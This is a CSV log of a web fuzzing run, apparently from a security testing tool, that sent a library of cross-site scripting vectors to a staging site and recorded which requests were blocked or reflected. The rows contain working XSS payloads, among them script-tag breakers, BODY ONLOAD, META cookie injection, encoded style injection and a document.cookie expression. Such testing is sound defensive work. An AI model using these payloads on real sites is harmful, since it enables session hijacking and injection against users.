Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
145,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,121,426,5493,,Blocked,[Author Name: kishor]
128,Fuzzed,Tue Jun 02 18:24:35 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,3306,579,128,265,230742,,Reflected,[Basic JS breaker variant 6]
147,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 9]
148,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,150,426,5490,,Blocked,[Exploit String: ;//%0da=eval;b=alert;a(b(10));//]
149,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,263,579,209,426,5581,,Blocked,"[Exploit Description: Breaks double quoted strings, injects a comment, carriage return and finally an alert.]"
150,Fuzzed,Tue Jun 02 18:24:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,161,579,142,426,5514,,Blocked,"[Exploit Tags: general, JS breaking, CRLF]"
151,Fuzzed,Tue Jun 02 18:24:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,192,579,121,426,5493,,Blocked,[Author Name: kishor]
111,Fuzzed,Tue Jun 02 18:24:53 CEST 2020,POST,https://staging.itapp.eus/,200,OK,400,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 3]
153,Fuzzed,Tue Jun 02 18:24:53 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,143,426,5515,,Blocked,[Exploit Name: Basic JS breaker variant 10]
154,Fuzzed,Tue Jun 02 18:24:53 CEST 2020,POST,https://staging.itapp.eus/,200,OK,187,579,150,426,5490,,Blocked,[Exploit String: ';//%0da=eval;b=alert;a(b(9));//]
155,Fuzzed,Tue Jun 02 18:24:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,199,579,209,426,5581,,Blocked,"[Exploit Description: Breaks single quoted strings, injects a comment, carriage return and finally an alert.]"
156,Fuzzed,Tue Jun 02 18:24:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,206,579,161,426,5533,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated, CRLF]"
157,Fuzzed,Tue Jun 02 18:24:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,205,579,121,426,5493,,Blocked,[Author Name: kishor]
134,Fuzzed,Tue Jun 02 18:25:16 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,12687,579,128,265,230796,,Reflected,[Basic JS breaker variant 7]
159,Fuzzed,Tue Jun 02 18:25:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,511,579,153,426,5525,,Blocked,[Exploit Name: Basic single quoted attribute breaker]
160,Fuzzed,Tue Jun 02 18:25:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,199,579,146,426,5532,,Blocked,[Exploit String: '> <script>alert(3)</script>]
161,Fuzzed,Tue Jun 02 18:25:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,350,579,188,426,5560,,Blocked,[Exploit Description: This vector breaks single quoted attributes and appends an alert.]
162,Fuzzed,Tue Jun 02 18:25:30 CEST 2020,POST,https://staging.itapp.eus/,200,OK,212,579,145,426,5517,,Blocked,"[Exploit Tags: general, html breaking, basic]"
163,Fuzzed,Tue Jun 02 18:25:30 CEST 2020,POST,https://staging.itapp.eus/,200,OK,265,579,121,426,5493,,Blocked,[Author Name: kishor]
165,Fuzzed,Tue Jun 02 18:25:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,379,579,135,426,5507,,Blocked,[Exploit Name: Basic title breaker]
166,Fuzzed,Tue Jun 02 18:25:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,273,579,151,426,5541,,Blocked,[Exploit String: </title><script>alert(1)</script>]
167,Fuzzed,Tue Jun 02 18:25:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,278,579,183,426,5555,,Blocked,[Exploit Description: This basic vector breaks HTML titles and injects JavaScript.]
168,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,333,579,161,426,5533,,Blocked,"[Exploit Tags: general, html breaking, basic, title breaking]"
169,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,434,579,121,426,5493,,Blocked,[Author Name: kishor]
171,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,200,OK,287,579,123,426,5495,,Blocked,[Exploit Name: BGSOUND]
172,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,251,579,158,426,5529,,Blocked,"[Exploit String: <BGSOUND SRC=""javascript:alert('XSS');"">]"
173,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,224,579,130,426,5502,,Blocked,[Exploit Description: BGSOUND]
174,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,272,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
175,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,294,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
176,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,257,579,123,426,5495,,Blocked,[BODY background-image]
177,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,216,579,137,426,5509,,Blocked,[Exploit Name: BODY background-image]
178,Fuzzed,Tue Jun 02 18:25:39 CEST 2020,POST,https://staging.itapp.eus/,200,OK,338,579,162,426,5533,,Blocked,"[Exploit String: <BODY BACKGROUND=""javascript:alert('XSS');"">]"
179,Fuzzed,Tue Jun 02 18:25:40 CEST 2020,POST,https://staging.itapp.eus/,200,OK,264,579,133,426,5505,,Blocked,[Exploit Description: BODY image]
180,Fuzzed,Tue Jun 02 18:25:40 CEST 2020,POST,https://staging.itapp.eus/,200,OK,845,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
181,Fuzzed,Tue Jun 02 18:25:40 CEST 2020,POST,https://staging.itapp.eus/,200,OK,876,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
183,Fuzzed,Tue Jun 02 18:25:41 CEST 2020,POST,https://staging.itapp.eus/,200,OK,229,579,127,426,5499,,Blocked,[Exploit Name: BODY ONLOAD]
184,Fuzzed,Tue Jun 02 18:25:41 CEST 2020,POST,https://staging.itapp.eus/,200,OK,631,579,144,426,5520,,Blocked,[Exploit String: <BODY ONLOAD=alert('XSS')>]
185,Fuzzed,Tue Jun 02 18:25:42 CEST 2020,POST,https://staging.itapp.eus/,200,OK,325,579,260,426,5634,,Blocked,[Exploit Description: BODY tag (I like this method because it doesn't require using any variants of ”javascript:” or ”<SCRIPT...” to accomplish the XSS attack)]
186,Fuzzed,Tue Jun 02 18:25:42 CEST 2020,POST,https://staging.itapp.eus/,200,OK,529,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
187,Fuzzed,Tue Jun 02 18:25:42 CEST 2020,POST,https://staging.itapp.eus/,200,OK,333,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
170,Fuzzed,Tue Jun 02 18:25:38 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,14341,579,109,172,332,,,[BGSOUND]
188,Fuzzed,Tue Jun 02 18:25:43 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9502,579,144,172,332,,,[Camouflaged comment injection with JS link]
182,Fuzzed,Tue Jun 02 18:25:41 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,11647,579,113,172,332,,,[BODY ONLOAD]
158,Fuzzed,Tue Jun 02 18:25:34 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,17947,579,139,172,332,,,[Basic single quoted attribute breaker]
164,Fuzzed,Tue Jun 02 18:25:50 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9175,579,121,172,332,,,[Basic title breaker]
190,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,122,172,332,,,[Exploit String: <!--]
192,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,147,172,332,,,[- --><a href=javascript:alert:document.domain]
191,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,111,172,332,,,"[<A href=""]"
189,Fuzzed,Tue Jun 02 18:25:52 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,158,172,332,,,[Exploit Name: Camouflaged comment injection with JS link]
193,Fuzzed,Tue Jun 02 18:25:59 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,110,172,332,,,[>test-->]
194,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9126,579,204,172,332,,,[Exploit Description: This vector evades filters by camouflaging as a comment and inhabiting a JS link.]
195,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,172,172,332,,,"[Exploit Tags: general, obfuscated, comment breaking, internet explorer]"
197,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,118,172,332,,,[Case Insensitive]
196,Fuzzed,Tue Jun 02 18:26:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9127,579,131,172,332,,,[Author Name: thespanner.co.uk]
198,Fuzzed,Tue Jun 02 18:26:09 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9120,579,132,172,332,,,[Exploit Name: Case Insensitive]
200,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9121,579,158,172,332,,,[Exploit Description: Case insensitive XSS attack vector.]
199,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9122,579,151,172,332,,,[Exploit String: <IMG SRC=JaVaScRiPt:alert('XSS')>]
201,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9127,579,146,172,332,,,"[Exploit Tags: general, evil tags, obfuscated]"
202,Fuzzed,Tue Jun 02 18:26:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9124,579,127,172,332,,,[Author Name: ha.ckers.org]
203,Fuzzed,Tue Jun 02 18:26:18 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9122,579,128,172,332,,,[Character Encoding Example]
208,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,355,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
205,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,200,OK,7555,579,624,426,5498,,Blocked,[Exploit String: <%3C&lt&lt;&LT&LT;&#60&#060&#0060&#00060&#000060&#0000060&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&#x3c&#x03c&#x003c&#x0003c&#x00003c&#x000003c&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&#X3c&#X03c&#X003c&#X0003c&#X00003c&#X000003c&#X3c;&#X03c;&#X003c;&#X0003c;&#X00003c;&#X000003c;&#x3C&#x03C&#x003C&#x0003C&#x00003C&#x000003C&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&#X3C&#X03C&#X003C&#X0003C&#X00003C&#X000003C&#X3C;&#X03C;&#X003C;&#X0003C;&#X00003C;&#X000003C;\x3c\x3C\u003c\u003C]
207,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,200,OK,7548,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
211,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,126,426,5504,,Blocked,[Exploit String: <script>]
210,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,207,579,154,426,5526,,Blocked,[Exploit Name: Closing JS Tag in JS String assignment]
212,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,703,579,166,426,5527,,Blocked,"[var a = ""</script> <script> alert('XSS !'); </script> <script>"";]"
213,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,654,579,111,426,5489,,Blocked,[</script>]
214,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,264,426,5636,,Blocked,"[Exploit Description: For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.]"
215,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,165,579,153,426,5525,,Blocked,"[Exploit Tags: general, gecko, obfuscated, evil tags]"
204,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,200,OK,8593,579,142,426,5514,,Blocked,[Exploit Name: Character Encoding Example]
217,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,227,579,121,426,5507,,Blocked,[Commented-out Block]
218,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,216,579,135,426,5507,,Blocked,[Exploit Name: Commented-out Block]
216,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,260,579,125,426,5497,,Blocked,[Author Name: t3rmin4t0r]
219,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,158,579,178,426,5538,,Blocked,[Exploit String: <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->]
220,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,187,579,504,426,5875,,Blocked,"[Exploit Description: Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.]"
221,Fuzzed,Tue Jun 02 18:26:28 CEST 2020,POST,https://staging.itapp.eus/,200,OK,168,579,176,426,5548,,Blocked,"[Exploit Tags: general, obfuscated, conditional comments, internet explorer]"
222,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
206,Fuzzed,Tue Jun 02 18:26:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9124,579,325,172,332,,,"[Exploit Description: All of the possible combinations of the character ”<” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).]"
224,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,159,426,5531,,Blocked,[Exploit Name: Comment-breaker using obfuscated JavaScript]
223,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,145,426,5517,,Blocked,[Comment-breaker using obfuscated JavaScript]
225,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,183,579,154,426,5498,,Blocked,[Exploit String: */a=eval;b=alert;a(b(/e/.source));/*]
226,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,183,426,5555,,Blocked,[Exploit Description: This vector creates an alert by breaking multiline comments.]
228,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,171,579,121,426,5493,,Blocked,[Author Name: kishor]
227,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,178,579,154,426,5526,,Blocked,"[Exploit Tags: general, comment breaking, JS breaking]"
231,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,192,426,5562,,Blocked,[Exploit String: width: expression((window.r==document.cookie)?'':alert(r=document.cookie))]
232,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,302,426,5674,,Blocked,[Exploit Description: This vector uses JavaScript conditional statements to inject an alert into CSS properties - it was once used as a PoC for a vulnerability in Stefan Di Paolos data binding example.]
230,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,173,579,150,426,5522,,Blocked,[Exploit Name: Conditional style injection for IE]
234,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,124,426,5496,,Blocked,[Author Name: DoctorDan]
233,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,182,579,171,426,5543,,Blocked,"[Exploit Tags: general, obfuscated, internet explorer, style injection]"
229,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2047,579,136,265,184075,,Reflected,[Conditional style injection for IE]
235,Fuzzed,Tue Jun 02 18:26:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,17612,579,117,426,5476,,,[Content Replace]
209,Fuzzed,Tue Jun 02 18:26:27 CEST 2020,POST,https://staging.itapp.eus/,200,OK,19770,579,140,426,5480,,,[Closing JS Tag in JS String assignment]
237,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,180,426,5562,,Blocked,"[Exploit String: <A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>]"
239,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
240,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,174,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
236,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,182,579,131,426,5503,,Blocked,[Exploit Name: Content Replace]
238,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,186,579,541,426,5854,,Blocked,[Exploit Description: Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&#x26;#x09;script:” was converted into ”java&#x09;script:”.]
242,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,135,426,5507,,Blocked,[Exploit Name: Cookie Manipulation]
244,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,143,579,672,426,6046,,Blocked,"[Exploit Description: Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).]"
243,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,195,426,5581,,Blocked,"[Exploit String: <META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">]"
245,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,150,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
246,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,150,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
247,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,124,426,5496,,Blocked,[DIV background-image 1]
249,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,150,579,178,426,5554,,Blocked,"[Exploit String: <DIV STYLE=""background-image: url(javascript:alert('XSS'))"">]"
248,Fuzzed,Tue Jun 02 18:29:21 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,138,426,5510,,Blocked,[Exploit Name: DIV background-image 1]
250,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,143,426,5515,,Blocked,[Exploit Description: Div background-image]
251,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,151,426,5523,,Blocked,"[Exploit Tags: general, evil tags, style injection]"
253,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,124,426,5496,,Blocked,[DIV background-image 2]
252,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
254,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,141,579,138,426,5510,,Blocked,[Exploit Name: DIV background-image 2]
255,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,182,426,5526,,Blocked,"[Exploit String: <DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">]"
256,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,511,426,5883,,Blocked,"[Exploit Description: Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)]"
257,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,155,579,151,426,5523,,Blocked,"[Exploit Tags: general, evil tags, style injection]"
258,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,140,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
260,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,389,579,130,426,5643,,Blocked,[Exploit Name: DIV expression]
262,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,303,579,271,426,5643,,Blocked,[Exploit Description: Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”]
263,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,176,579,171,426,5543,,Blocked,"[Exploit Tags: general, evil tags, style injection,  internet explorer]"
264,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,196,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
261,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,761,579,164,426,5535,,Blocked,"[Exploit String: <DIV STYLE=""width: expression(alert('XSS'));"">]"
265,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,201,579,115,426,5487,,Blocked,[DIV w/Unicode]
266,Fuzzed,Tue Jun 02 18:29:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,236,579,129,426,5501,,Blocked,[Exploit Name: DIV w/Unicode]
267,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,141,579,291,426,5721,,Blocked,"[Exploit String: <DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">]"
268,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,141,579,349,426,5721,,Blocked,[Exploit Description: DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.]
269,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,154,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
272,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,147,579,142,426,5514,,Blocked,[Exploit Name: Double open angle brackets]
273,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,166,426,5544,,Blocked,[Exploit String: <IFRAME SRC=http://ha.ckers.org/scriptlet.html <]
274,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,472,426,5842,,Blocked,"[Exploit Description: This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't]"
275,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,184,579,152,426,5524,,Blocked,"[Exploit Tags: general, evil tags, injection, gecko]"
276,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,151,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
270,Fuzzed,Tue Jun 02 18:29:23 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,1654,579,127,265,228074,,Reflected,[Author Name: ha.ckers.org]
278,Fuzzed,Tue Jun 02 18:29:24 CEST 2020,POST,https://staging.itapp.eus/,200,OK,201,579,130,426,5502,,Blocked,[Exploit Name: Dword Encoding]
279,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,169,579,154,426,5536,,Blocked,"[Exploit String: <A HREF=""http://1113982867/"">XSS</A>]"
280,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,210,579,209,426,5581,,Blocked,[Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).]
281,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,146,426,5518,,Blocked,"[Exploit Tags: general, evil tags, obfuscated]"
277,Fuzzed,Tue Jun 02 18:29:24 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,1614,579,116,265,228052,,Reflected,[Dword Encoding]
282,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
284,Fuzzed,Tue Jun 02 18:29:25 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,127,426,5499,,Blocked,[Exploit Name: Embed Flash]
